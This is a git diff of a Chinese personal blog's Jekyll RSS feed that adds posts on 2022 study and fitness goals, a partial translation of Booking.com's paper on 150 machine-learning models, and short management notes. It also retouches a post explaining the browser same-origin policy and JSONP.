@@ -3,11 +3,171 @@
   <channel>
     <title>咖啡不苦</title>
     <description>赖晨东的博客 | 咖啡不苦</description>
-    <link>http://laichendong.com/</link>
-    <atom:link href="http://laichendong.com/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Sun, 28 Jun 2020 18:39:01 +0800</pubDate>
-    <lastBuildDate>Sun, 28 Jun 2020 18:39:01 +0800</lastBuildDate>
-    <generator>Jekyll v3.8.5</generator>
+    <link>http://localhost:4000/</link>
+    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
+    <pubDate>Fri, 14 Jan 2022 10:12:52 +0800</pubDate>
+    <lastBuildDate>Fri, 14 Jan 2022 10:12:52 +0800</lastBuildDate>
+    <generator>Jekyll v4.2.1</generator>
+    
+      <item>
+        <title>2022-flags</title>
+        <description>&lt;h1 id=&quot;考研-北航--软件学院--电子信息00854&quot;&gt;考研 北航  软件学院  电子信息（00854）&lt;/h1&gt;
+&lt;h2 id=&quot;数学二跟住张宇全程班&quot;&gt;数学二，跟住张宇全程班&lt;/h2&gt;
+&lt;p&gt;基础阶段：1-5月中《基础30讲》&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;1-3月底：高数基础18讲  ：  每周一讲&lt;/li&gt;
+  &lt;li&gt;4-5月中：线代基础6讲  ： 每周一讲
+刷题阶段：《题源1000题》
+强化阶段：
+真题、冲刺阶段：
+    &lt;h2 id=&quot;英语二&quot;&gt;英语二&lt;/h2&gt;
+  &lt;/li&gt;
+  &lt;li&gt;每天至少一篇 voa learning English， 后期可加入voa新闻&lt;/li&gt;
+  &lt;li&gt;一周一套历年真题（除写作）：把相关单词也背了&lt;/li&gt;
+  &lt;li&gt;写作专项
+    &lt;h2 id=&quot;政治&quot;&gt;政治&lt;/h2&gt;
+  &lt;/li&gt;
+  &lt;li&gt;6月开始？-徐涛强化课，书，1000题&lt;/li&gt;
+  &lt;li&gt;冲刺课什么时候跟？ 腿姐？肖？
+    &lt;h2 id=&quot;专业课&quot;&gt;专业课&lt;/h2&gt;
+  &lt;/li&gt;
+  &lt;li&gt;王道数据结构课程全看完&lt;/li&gt;
+  &lt;li&gt;C语言怎么办？&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;跑步--400公里120次体重降到130以下&quot;&gt;跑步  400公里(120次)，体重降到130以下&lt;/h1&gt;
+&lt;p&gt;一年8个月隔天跑，每次4公里！&lt;/p&gt;
+&lt;h1 id=&quot;读书--10本&quot;&gt;读书？  10本&lt;/h1&gt;
+&lt;h1 id=&quot;投资理财&quot;&gt;投资理财&lt;/h1&gt;
+</description>
+        <pubDate>Tue, 04 Jan 2022 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/2022/01/04/2022-flags/</link>
+        <guid isPermaLink="true">http://localhost:4000/2022/01/04/2022-flags/</guid>
+        
+        <category>OKR</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>150个成功的机器学习模型：Booking从中学到的6件事儿</title>
+        <description>&lt;h2 id=&quot;摘要&quot;&gt;摘要&lt;/h2&gt;
+&lt;p&gt;booking.com是全世界最大的在线旅行服务商。拥有数以百万的消费者和数以百万的酒店提供者，形式包括传统酒店、公寓、民宿、客房等等。早在几年前，我们就运用机器学习技术来提高客户体验及业务指标了。大部分的机器学习的文章都关注在算法和数据相关的方面，很少有人能说明在一个商业利益至上的工业化社会里机器学习技术是如何能产生真正有意义的影响的。我们分析了150个面向消费者的成功的机器学习应用，这些应用是由booking里不同的团队开发的，为全世界数十亿用户使用，并且通过了严格的随机对照实验（RCT）测试。接下来会说明一下我们使用的方法，遇到的挑战和将一个如此复杂的技术推广运用到整个组织的过程中总结的经验教训。我们的主要结论是，一个迭代的、假设驱动的过程，与其他学科相结合，是构建 150 个成功的机器学习产品的基础。&lt;/p&gt;
+&lt;h2 id=&quot;1绪论&quot;&gt;1、绪论&lt;/h2&gt;
+&lt;p&gt;booking.com是全世界最大的在线旅行服务商。拥有数以百万的消费者和数以百万的酒店提供者，酒店形式包括传统酒店、公寓、民宿、客房等等。我们的平台是由许多不同的产品线上拥有不同专业的团队开发的，包括像booking助手这样的大型应用程序，或者是像搜索结果页这样的具有重要商业价值的网页，也可以是某个网页的一部分，比如在搜索结果页最下面的目的地推荐。不同团队有他们不同的目的，并且使用不同的业务指标来衡量他们的产品价值以及验证假设，这是我们学习过程的核心。我们平台遇到的几个独有的挑战我将他们简短的列在下面：
+&lt;strong&gt;高风险：&lt;/strong&gt; 如果推荐错了电影、音乐、书籍和产品会影响用户体验。但绝大部分情况都有可以“撤销”的机会：不听这首歌或不看这个电影，甚至是将不满意的商品退货。但是，一旦你到了住的地方才发现和你想象的不一样，就没那么容易撤销了，你会产生强烈的不满感觉并且离开我们的平台。
+&lt;strong&gt;查询输入特别少：&lt;/strong&gt; 用户搜索酒店的时候仅仅会提供他们的目的地，可能还有预定日期和客人的人数。要从这种几乎是0输入的情况下提供令人满意的预定和居住体验是我们的关键挑战之一。
+&lt;strong&gt;商品对象复杂：&lt;/strong&gt; 预定一个酒店需要用户在目的地，日期，酒店类型，房间数量，房间类型，退款策略等多个方面考虑。当一个可被预定的对象确定下来之后这些元素就构成了一个多维空间，而且并不是所有的排列组合都是可选的，所以非常难做决定，我们的用户需要帮助来找到最佳组合。
+&lt;strong&gt;供应受到约束：&lt;/strong&gt; 酒店的可预订状态是受限和动态的。结合价格，会直接影响消费者的偏好和供应商的行为。而这在设计用户体验时是不能被忽略的因素。
+&lt;strong&gt;持续的冷启：&lt;/strong&gt; 消费者通常处在一个持续冷启的状态中。大部分人一年只进行一到两次的旅行活动。当他再次回到我们网站事，他的偏好可能已经有了很大的改变，用户的历史信息通常变得不太重要。并且，每天都有新的酒店和酒店类型加入，他们没有足够的评价和描述内容，比如图片和多语言描述，这使得很难给到他们曝光。无论一个用户访问booking的频率如何，都能提供个性化的体验，并且，在一个新的酒店加入进来的一开始就能给他找到合适的受众，是我们面临的又一困难且非常重要的问题。
+&lt;strong&gt;内容过载：&lt;/strong&gt; 租所包含了非常丰富的内容，包括描述、图片、评价和打分。目的地本身也有很多内容，包括房客拍的照片，自然文本的评论内容，访客的推荐和指南。这是个非常强大的广告工具，但同时也非常复杂和难以被消费者认知。将如此丰富的内容以一种友好的方式呈现给用户，并且利用好这部分信息对我们平台来说又是一个关键的挑战。
+去年我们用机器学习技术来解决这些和其他一些问题。我们发现要真正的影响商业业绩难的超乎想象，此外，要将模型的的工作和观测到的影响独立开来或者理解他们的联系也很难。相关的问题被其他一些人也提到。Wagstaff发表论文称缺乏如何运用机器学习并在现实问题中产生相关影响的研究和经验。有一个和我们的课题更相近的例子，Jannach等介绍了在推荐系统领域如何用很少的指标来对推荐服务的指标产生影响，比如销售多样性，转化率或者忠诚度。很多其他的期刊也发表了各种具体的机器学习已经他们取得的商业成就的例子，但据我们所知还没有通过机器学习获得商业和用户价值的产品研发测试全过程的研究。
+在这个项目中我们分析了150成功的面向消费者的机器学习应用（以及许多相关的失败），分享我们遇到的挑战，我们是如何应对的，我们从中总结的经验教训和一般性建议。包括：&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;关于机器学习在一个商业产品中的影响的大规模研究，据我们所知，这是业界的第一个。&lt;/li&gt;
+  &lt;li&gt;一组涵盖了机器学习工程全部阶段的“经验总结”。&lt;/li&gt;
+  &lt;li&gt;一组解决我们在各个阶段发现的问题的技术解决方案。
+论文接下来的部分将按照开发一个机器学习应用的具体研发阶段来组织，用初始，建模，开发，监控和评估命名，以及在最后一节我们做了个总结。
+    &lt;h2 id=&quot;2初始阶段机器学习就是产品开发中的瑞士军刀&quot;&gt;2、初始阶段：机器学习就是产品开发中的瑞士军刀&lt;/h2&gt;
+    &lt;p&gt;在基于机器学习的工程的初始阶段，产品团队产生点子、假设、商业案例等等，机器学习作为解决方案的一部分。我们学到的一个重要经验就是机器学习可以在不同环境中广泛的被运用到各种不同的产品中。在实践中，我们的模型是帮助不同团队提升他们的产品或者从他们的用户中学习的工具。极端情况下，我们为一个用例建立非常专用的模型。例如，用来优化用户界面中一个特定元素的大小，或者在一个特定环境下的点击流漏斗中提供个性化的推荐。因为是专用模型，我们可以设计和调优到非常好的性能，以期望他们能创造强烈的商业影响。相反，他们的应用仅限于很少的一些用例。另一方面，我们也建立模型来表达有意义&lt;em&gt;语义层&lt;/em&gt;。这些模型可以理解抽象概念，可以让人在产品开发中基于模型的输出用来做新功能介绍、千人千面、促销信息推送等等。例如，他可以指征一个用户在旅行目的地上的灵活性，给到产品团队一个目的地弹性的概念，这样他们就可以提升他们的产品。这些模型提供了一个可解释的信号，并且在产品团队希望使用他们的所有上下文中都有效。这样的需求限制了将模型的预测结果和特定的商业目标结合在一起，但是这些模型的广泛使用抵消了这个缺点，整个平台上生成了几十个用例。具体地说，在我们的分析中，我们发现平均每个语义模型生成的用例是专用用例的两倍。&lt;/p&gt;
+    &lt;h3 id=&quot;21-模型系列&quot;&gt;2.1 模型系列&lt;/h3&gt;
+    &lt;p&gt;接下来这些段落探索了我们平台上已经开发的不同模型的系列，关注在他们怎么被产品团队使用来影响我们的用户的。这种分类方法可以作为一种理清机器学习能力的一个思维工具，形成我们解决绪论部分提到的问题的策略主干。&lt;/p&gt;
+    &lt;h4 id=&quot;211-旅行者偏好模型&quot;&gt;2.1.1 旅行者偏好模型&lt;/h4&gt;
+    &lt;p&gt;用户在不同的方面会表现出从无弹性到完全可弹的不同弹性。我们考虑了旅行的一些属性，像目的地，酒店价格，酒店位置，质量，日期，特色设施等等，为这些属性建设了一组机器学习模型，总的来说，构建了一个用户偏好的指标集给每一个属性分配一个弹性级别。这一类模型工作_语义层_。举个例子，日期弹性模型会给出一个用户对于旅行日期的弹性的量化评估。假如用户是有弹性的，在相关场景下就会给日期推荐，但是如果用户对此没有弹性，日期推荐就会造成用户的分心和疑惑，因此就不会显示。另外一种处理日期没弹性用户的方式是，用价格趋势或者是否可预订等信息来强化用户所选择的日期。&lt;/p&gt;
+    &lt;h4 id=&quot;212-旅行者情境模型&quot;&gt;2.1.2 旅行者情境模型&lt;/h4&gt;
+    &lt;p&gt;人们会以不同的角色进行旅行，和伴侣一起、和家人一起、和朋友一起或只是自己一个人，为了奢华享受或者只是商务出差。他们可能驱车去一个附近的城市，或者坐飞机去世界的另一边，他们可能在一个城市待很长一段时间，也可能在几个城市之间赶场。以上所有的这些例子都是我们所说的_旅行者情境_ ，它包含了一次旅行中的约束和需求。在我们平台上，大部分的这种情境都是不够明确的状态，但其实是可以被清楚描述的，只是被很多用户所遗忘了。因此，在用户预定过程中越早的预测或者猜测到用户所处的情境就越有价值。旅行者情境模型也是工作在语义层的。在这个例子中，研发团队就可以为不同的情境构建不同的特征。家庭出行模型就能预测一次用户的预定行为有多大概率是为家庭出行而进行的。有时候，家庭旅行者忘了填他们随行孩子的个数（如图1（a）），导致在预定过程都走了一大半了才发现选择的酒店不支持儿童入住。家庭出行模型就会提醒用户尽早的填写随行儿童的信息，避免造成上述令人失望的情况。
+&lt;img src=&quot;../misc/32754203ddc577cc8fe5752271f210df.png&quot; alt=&quot;32754203ddc577cc8fe5752271f210df.png&quot; /&gt;
+                                                                          图1：机器学习模型应用举例&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;213-商品浏览模型&quot;&gt;2.1.3 商品浏览模型&lt;/h4&gt;
+&lt;p&gt;大部分用户在寻找酒店的时候，都会通过几个条件来筛选，比如日期、属性、政策、位置等等。为了做出决定，他们必须跟踪他们看到的选项，同时探索相似的选项来做预定决定。我们的商品浏览模型既从这个过程中获得知识，又希望改善它。他们做出不同的动作，包括滚动、点击、排序、过滤等等。这些都会作为用户偏好的一种潜在反馈。这些信号可以被用来加速访问用户访问历史中的相关商品，也可以在全局范围内更快的召回相关商品。&lt;/p&gt;
+&lt;h4 id=&quot;214-用户界面优化模型&quot;&gt;2.1.4 用户界面优化模型&lt;/h4&gt;
+&lt;p&gt;字体的大小、列表中展示商品的个数、背景颜色和背景图片、视觉元素的存在与否等等，所有的这些都对以业务指标来衡量用户行为有很大的影响。这组模型为不同的业务目标来分别优化这些参数。我们发现很难用一个一刀切的特定的值来对此进行优化，所以我们的模型同时考虑了上下文和用户的信息来做出就好的关于界面优化的决定。&lt;/p&gt;
+&lt;h4 id=&quot;215-内容归纳&quot;&gt;2.1.5 内容归纳&lt;/h4&gt;
+&lt;p&gt;内容以文本、结构化的调研和照片等形式来描述目的地、地标、酒店等等，这些内容可能有酒店官方、客户、公共数据库等不同的来源。这里面有巨大的机会因为这些内容可以作为广告将用户吸引到特定的城市、日期甚至具体的酒店去。但这也非常复杂，信息量巨大且充满噪音，导致很难被用户使用。&lt;strong&gt;内容归纳&lt;/strong&gt; 就是让这些内容可以被人类所使用的过程。举个例子，我们收集了150万酒店超过17.1亿条的评价，这里面包含了许多关于酒店提供的特色服务的非常有价值的信息，并且这也是一个非常丰富的卖点信息来源。机器学习模型会去归纳这些评论，把酒店的亮点通过结构化的简短的总结表达出来（如图1（b））。&lt;/p&gt;
+&lt;h4 id=&quot;216-内容增强&quot;&gt;2.1.6 内容增强&lt;/h4&gt;
+&lt;p&gt;在用户浏览、选择、预定和评价一个酒店的全过程中，给我们传递了一些隐藏的信号，这些信号帮助我们对酒店能提供的服务和质量有了更深刻的理解。这组模型通过酒店的属性、目的地、甚至特定的日期信息来增强和清晰化酒店能提供的服务。内容增强有别于内容归纳的地方是，内容归纳是把已经存在的内容变得更加容易获得和理解，而内容增强是用其他方面的各种数据来增强对一个实体的描述。为了说明这个观点，我们来举两个例子：&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;最具性价比&lt;/strong&gt;: booking提供了丰富的酒店选择，以设施、位置、服务和设施的质量、政策和许多其他维度的形式提供不同级别的价值。用户需要评估房间的价格和他获得的价值的关系。“今日最佳性价比”标识通过高亮和别的酒店比起来最具性价比的酒店来简化这个过程。用一个机器学习模型来分析数以百万的酒店和他们的交易记录、数以百万的用户的评级来选择一个子集，打上“最具性价比”的标签。&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;价格趋势&lt;/strong&gt;：根据预定的预期、旅行的具体日期、目的地等不同的因素，价格会呈现出不同的动态。因为我们每天在每个城市都处理成千上万的预定信息，所以我们可以对一个城市的给定的时间和旅行日期建立一个精确的价格趋势模型。当模型发现一个特别的趋势时，我们可以给用户一些提示来帮助他们做出更好的选择，比如鼓励他们选择一个看起来更有机会的目的地和日期，或者劝他们放弃某些条件。值得注意的是，在这个例子中，被增强的对象不是一个酒店而是一个目的地城市（如图1（c））。
+    &lt;h3 id=&quot;22-全部模型可以提供的价值&quot;&gt;2.2 全部模型可以提供的价值&lt;/h3&gt;
+    &lt;p&gt;每一组模型都能单独的提供业务价值。图2展示的是在可比的情况下，每一个柱子表示模型对一个核心业务指标中位值的提升与基线之间的关系，基线是基于所有应用计算的，包括基于机器学习的和非机器学习的。绝大部分模型的贡献都高于基线，只有一个在基线以下，但把所有模型影响都加在一起明显是有巨大的正向贡献的。
+上面提到的图表显示了再引入或者改进了产品背后的机器学习模型带来的直接影响。我们还观察到当模型成为了一个新产品的基础时，会通过其他的产品产生价值。如此间接的影响很难被量化，但这些效果是清晰的并且是成为了产品团队共识的观念。作为一个例子，图3展示了开发一个目的地推荐系统的每一个研发过程。每一个柱子表示自顶向下关注在某一具体产品侧面的成功迭代，包括用户界面，目标受众，信息展示（标题、描述、消息等等），或者是算法本身。柱子的长度表示相对于第一次迭代的相对影响。所有这些提升都是通过第一个算法实现的，这展示了机器学习模型通过其他产品表现出来的间接影响力。
+&lt;img src=&quot;../misc/12a62838b85bab5e89eaa7e48e1159c6.png&quot; alt=&quot;12a62838b85bab5e89eaa7e48e1159c6.png&quot; /&gt;
+图2：机器学习模型对相关业务指标中位值的影响
+&lt;img src=&quot;../misc/0af815c3281ba2f1ae6e8a05b70b6d37.png&quot; alt=&quot;0af815c3281ba2f1ae6e8a05b70b6d37.png&quot; /&gt;
+图3：在推荐产品上的一系列实验。每一个实验都只专注测试一个机器学的设置或训练方法。柱子的长度表示相对于第一个版本观测到的影响。&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;3建模阶段离线模型只扮演体检的角色&quot;&gt;3、建模阶段：离线模型只扮演体检的角色&lt;/h2&gt;
+&lt;p&gt;通常，评估模型质量的方式是评估或预测模型在没有见过的数据集下的性能表现。用不同的交叉验证方式来评估不同类型的任务（分类、回归、排序），在booking里，我们非常关心一个模型给用户和业务带来的价值。这种价值是通过随机对照实验（RCTs）和转化率、售后单量、退款数等业务指标来衡量的。一个非常有趣的发现是，提高一个模型的性能，不一定会带来价值的提高。图4展示这个洞察。每个点表示一个已经用RCT证明过价值的模型和新模型的对比。横轴表示新模型和当前基线在离线模式下评估的性能差异。数据是分别用ROC、AUC和平均倒数排名的方法来衡量分类和排序算法得来的。纵轴表示的是两个模型在RCT实验中观察到的业务指标上的差异（所有的模型都指向同一个业务指标）。我们一共统计了23对比较（46个模型），目测就可以看出来相关性不足。细致结论是在90%置信区间（-0.45到0.27）的皮尔森相关系数为-0.1，以及在90%置信区间（-0.5到0.19）的斯皮尔曼相关系数为-0.18。要强调的是这种相关性不足不是表现在离线和在线模型之间，而是表现在离线模型性能提升和商业价值提升之间。同时，我们也不想扩大这个结论的一般性，结论的外部有效性很容易被挑战，因为这些模型都是在一个特定的环境中、特定的系统里、以特定的方式构建、全部都有同样的业务目标、并且是都期望提升一个其他模型已经能够提升的指标。然而，我们仍然认为这种相关性的缺乏是一个非凡的发现。事实上，这个发现让我们审视了booking里其他的领域，并且持续得到同样的结果。例如[8]强调了机器翻译（BLEU）的标准性能指标和人类指标表现出非常脆弱的相关性。只有当离线指标和业务指标几乎完全一致是，才能观测到一些相关性。
+这种现象可以被解释为各种各样的原因，下面列举一些我们认为最相关的如下：&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;价值饱和&lt;/strong&gt; 很明显，业务的价值不能被模型性能的增长而无限提升。在某些点上的价值相对于模型性能来说已经饱和了，模型性能的增长已经不能带来价值的增长，或者只能带来很小的增长，小到没办法在RCT实验中被监测到。&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;阶段饱和&lt;/strong&gt; 对比基线测试一个新模型时，我们引入“触发分析（triggered analysis）”来保证我们只关注暴露在更改中的用户，即和模型预测不一致的用户，随着模型的互相改进，这种不一致率会下降，从而实际暴露在新策略的用户和对价值增长的观测能力也会下降。更多的关于模型比较测试的方法细节在后面7.4节会做说明。&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;恐怖谷效应&lt;/strong&gt; 随着模型变得越来越好，他们看起来对我们的用户了解的越来越多，或者把用户想做的事情都预测的很好，这可能会让我们的一些客户感到不安（见图 5 和 [10]），这可能会对价值产生负面影响。&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;代理指标的过度优化&lt;/strong&gt; 通常，我们的机器学习模型是有监督的，他们优化的指标未必是某个客观的业务指标。比如，我们可能基于CTR构建一个推荐系统，因为我们知道，CTR和我们真正关心的业务指标——转化率高度相关，甚至是因果关系。但是，随着模型变得越来越厉害，他最终可能变成了只提高点击率，而对转化率没有任何真正的影响。这里有个例子是模型学到了推荐给用户和他正在看的非常类似的酒店，引导用户点击（比较所有相似的酒店）但实际上是把用户置于了一个选择困难当中，最终伤害了转化率。通常来说，对代理指标的过度优化将导致用户的分心而偏离了目标。
+ &lt;img src=&quot;../misc/2b7fc7303d0f81227ce70f1a76212f55.png&quot; alt=&quot;2b7fc7303d0f81227ce70f1a76212f55.png&quot; /&gt;
+ 图4：新模型对基线模型的性能变化与业务指标的变化之间的相关性
+ &lt;img src=&quot;../misc/bc4d00a50d49e03f405f877e1cbc0b80.png&quot; alt=&quot;bc4d00a50d49e03f405f877e1cbc0b80.png&quot; /&gt;
+ 图5：恐怖谷：用户不总是对正确的预测做出正向的反应（用马尔科夫链做目的地推荐）。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;单独解决这些问题中的每一个都挺难的。我们的方法是依靠一个开发的快速循环，建立最小模型然后在实验中检验他们，然后用实验结果保持整个事情的持续迭代。离线模型的性能指标只起到一个体检的作用，用来保证算法做的事儿确实是我们想要的。这个循环驱使我们从关注模型的离线性能指标转向产品开发过程中的很多方面，多维度的推进迭代的过程。这些包括下一节中描述的问题构建过程、模型的定性方面（如多样性、透明度、适应性等）、实验设计和延迟。作为一个例子，考虑一个推荐系统，他会预测一个用户对酒店的评级。最小化RMSE（均方根誤差）看起来是一个合理的方法。经过一系列成功的迭代以后，我们假设模型已经丧失多样性了，所以我们建立一个挑战者模型，仍然是降低RMSE，但是要产生更高的多样性。看起来新模型有更高的RMSE，但是他成功的增加了多样性从而使这个RMSE有了合理的解释。这会用来做“多样性问题”的假设验证。不确定的结果会指向模型或者实验设计的调整，来保证我们给了假设一个公平的机会。负向的结果可能会拒绝这个概念，另一方面，正向的结果将鼓励做与多样性相关的变化，不仅是模型，包括用户界面甚至是整个产品都这样&lt;/p&gt;
+
+&lt;h2 id=&quot;建模在解决一个问题之前先设计他&quot;&gt;建模：在解决一个问题之前，先设计他&lt;/h2&gt;
+&lt;p&gt;建模阶段需要构建机器学习模型来解决当前的业务问题。基本上第一步就是“定义”一个机器学习问题，而且我们知道，这一步非常关键。问题定义的过程就是将业务case和概念输入然后输出一个定义好的模型问题（通常倾情况下是一个有监督的机器学习问题。）所以好的解决方案依赖给到模型的case和概念输入。通常要预测的点是给定的，这就固定了特征空间的范围，但是目标变量和观测空间并不总是给定的，并且需要被仔细的设计。举个例子，在考虑前面提到过的日期弹性模型时，我们想要知道用户每次提交搜索时的日期弹性。这里弹性的定义并不是非常的清楚：是不是意味着这个用户比别的用户考虑更多的候选日期？或者是用户最终会预定的日期和他们正在看的日期不一样？又或者是用户愿意为一个更好的价格修改预定日期？等等。这些每一种不同的对弹性的定义都可以有不同的学习步骤与之对应。比如，我们可以在一个由被观测用户组成的数据集上用回归的方法来学习预测一个用户可能会考虑多少个不同的日期，或者当观察的是搜索用户时，可以通过分类的方法来评估用户修改日期的可能性，等等。这些都是构建好的机器学习问题，然后我们解决他，输出一个用户的日期弹性模型。
+ 为了比较可替代的问题，我们遵循一个简单的启发式的方法，其中考虑到：&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;学习难度&lt;/strong&gt; 在对这些非常主观的概念进行建模时，目标变量不是以真值的方式给定的，而是通过构建出来的。然而，有些设定会比其他一些更难。量化可学习性是不容易的。对于分类问题，贝叶斯错误是一个很好的衡量指标，因为它只依赖于数据集。我们使用Tumer和Ghosh【12】的方法。另一种适用于排序问题的方法是将简单模型的性能和随机或大众这些基线进行比较。首选哪些简单模型可以比基线模型做的更好的设置。&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;数据和概念的匹配&lt;/strong&gt; 有一些设置使用的数据更贴近我们想要建模的概念。比如在日期弹性的例子中，我们可以给一组日期，问用户他们是否知道他们想旅行的日子。然后构建一个模型来预测答案。这将是一个非常直接的分类问题，比起其他方案，更贴近日期弹性这个概念。但另一方面，这个数据会有严重的选择偏差，因为标签只适用于受访者。&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;选择偏差&lt;/strong&gt; 如前所述，构建标签和观测空间很容易引入选择偏差。一个无偏的问题求对观测空间做1对1的映射，但这不总是可能的和最优的。判断选择偏差十分简单：&lt;/li&gt;
+&lt;/ul&gt;
+
+</description>
+        <pubDate>Thu, 16 Dec 2021 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/2021/12/16/150-successful-ML-models/</link>
+        <guid isPermaLink="true">http://localhost:4000/2021/12/16/150-successful-ML-models/</guid>
+        
+        <category>翻译</category>
+        
+        
+        <category>Reading</category>
+        
+      </item>
+    
+      <item>
+        <title>倾听</title>
+        <description>
+</description>
+        <pubDate>Thu, 02 Dec 2021 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/2021/12/02/listening/</link>
+        <guid isPermaLink="true">http://localhost:4000/2021/12/02/listening/</guid>
+        
+        <category>管理修炼</category>
+        
+        
+        <category>Reading</category>
+        
+      </item>
+    
+      <item>
+        <title>沟通-看到对方真正的需求，避免沟通僵局</title>
+        <description>&lt;p&gt;沟通的第一定律：在沟通的过程中，人最本能的关注点都是自己&lt;/p&gt;
+</description>
+        <pubDate>Thu, 02 Dec 2021 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/2021/12/02/communication/</link>
+        <guid isPermaLink="true">http://localhost:4000/2021/12/02/communication/</guid>
+        
+        <category>管理修炼</category>
+        
+        
+        <category>Reading</category>
+        
+      </item>
     
       <item>
         <title>log-2020年06月23日</title>
@@ -25,8 +185,8 @@
 
 </description>
         <pubDate>Tue, 23 Jun 2020 00:00:00 +0800</pubDate>
-        <link>http://laichendong.com/2020/06/23/log-2020-06-23/</link>
-        <guid isPermaLink="true">http://laichendong.com/2020/06/23/log-2020-06-23/</guid>
+        <link>http://localhost:4000/2020/06/23/log-2020-06-23/</link>
+        <guid isPermaLink="true">http://localhost:4000/2020/06/23/log-2020-06-23/</guid>
         
         
       </item>
@@ -48,11 +208,11 @@ http://abc.com 和 http://abc.com:8080 不同源，端口不同
 http://a.abc.com 和 http://b.abc.com 也不同源，域名不同
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;也就是说，上面这些页面之间都不能发送请求。你可能会感到奇怪，“我的网页的静态资源都放在cdn域名里，比如公共js，然后加载到页面执行，一点问题都没有啊”，这是不是违法了同源策略？嗯，所以同源策略里规定的“&lt;strong&gt;访问&lt;/strong&gt;”是一个相对模糊的概念。一般来说：&lt;strong&gt;内嵌一个跨源的资源是被允许的，但是读取一个跨源的资源是不允许的。&lt;/strong&gt;比如，你可以用&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;iframe src=''/&amp;gt;&lt;/code&gt;嵌入一个跨源的页面（当然，被嵌入的页面的服务器端可以设置&lt;code class=&quot;highlighter-rouge&quot;&gt;X-Frame-Options&lt;/code&gt;响应头来控制自己允不允许被iframe嵌入，可以在一定程度上防止黑客制作钓鱼网站），但不能用js获得这个被嵌入的页面里的dom对象引用。&lt;/p&gt;
+&lt;p&gt;也就是说，上面这些页面之间都不能发送请求。你可能会感到奇怪，“我的网页的静态资源都放在cdn域名里，比如公共js，然后加载到页面执行，一点问题都没有啊”，这是不是违法了同源策略？嗯，所以同源策略里规定的“&lt;strong&gt;访问&lt;/strong&gt;”是一个相对模糊的概念。一般来说：&lt;strong&gt;内嵌一个跨源的资源是被允许的，但是读取一个跨源的资源是不允许的。&lt;/strong&gt;比如，你可以用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;iframe src=&apos;&apos;/&amp;gt;&lt;/code&gt;嵌入一个跨源的页面（当然，被嵌入的页面的服务器端可以设置&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-Frame-Options&lt;/code&gt;响应头来控制自己允不允许被iframe嵌入，可以在一定程度上防止黑客制作钓鱼网站），但不能用js获得这个被嵌入的页面里的dom对象引用。&lt;/p&gt;
 
 &lt;p&gt;更具体的来说，下面列出来哪些动作被允许，哪些动作不被允许。&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1、**iframe**，  一般来说，用src跨源嵌入是可以的，但不让读取里面的内容
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1、**iframe**，  一般来说，用src跨源嵌入是可以的，但不让读取里面的内容
 
 2、**css**，可以用link标签和@import来嵌入，但是要正确的设置Content-Type
 
@@ -75,22 +235,22 @@ http://a.abc.com 和 http://b.abc.com 也不同源，域名不同
 
 &lt;h2 id=&quot;jsonpjson-with-padding技术&quot;&gt;JSONP（JSON with padding）技术&lt;/h2&gt;
 
-&lt;p&gt;这是一种被普遍使用的，绕过浏览器同源策略的数据共享方法。他的基本思想是，在网页里插入一个&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script /&amp;gt;&lt;/code&gt;元素，用script标签的src属性加载一个跨源脚本（这是被允许的），这个脚本的服务端，将要共享的数据以JSON的格式放到一个指定名字的回调函数的入参里（with padding）传回来。页面的回调函数实现就拿到跨源的共享数据了。&lt;/p&gt;
+&lt;p&gt;这是一种被普遍使用的，绕过浏览器同源策略的数据共享方法。他的基本思想是，在网页里插入一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;script /&amp;gt;&lt;/code&gt;元素，用script标签的src属性加载一个跨源脚本（这是被允许的），这个脚本的服务端，将要共享的数据以JSON的格式放到一个指定名字的回调函数的入参里（with padding）传回来。页面的回调函数实现就拿到跨源的共享数据了。&lt;/p&gt;
 
 &lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/**
 * 工具函数，往页面里插入一个指定src的script标签，以发起请求
 * 其实也可以发起ajax请，很多三方库（比如jQuery）都有封装
 */&lt;/span&gt;
